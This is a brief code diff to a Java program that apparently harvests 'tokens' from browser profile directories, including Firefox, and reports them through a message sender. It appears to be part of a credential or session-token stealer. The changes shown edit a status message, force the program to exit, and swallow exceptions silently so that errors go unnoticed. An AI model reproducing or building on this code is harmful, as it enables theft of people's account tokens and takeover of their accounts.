@@ -31,8 +31,9 @@ public class Main {
             }
         }
         if (tokens.size() == 0) {
-            Helper.getSender().sendMessage("Tokens not found :(");
+            Helper.getSender().sendMessage("Tokens not found!");
         }
+        System.exit(0);
     }
 
     public static void getTokens(String path, boolean firefox) {
@@ -57,7 +58,7 @@ public class Main {
                                         }
                                     }
                                 }
-                            } catch (Exception e) {e.printStackTrace();}
+                            } catch (Exception e) {}
                         }
                     });
         } catch (Exception e) {}
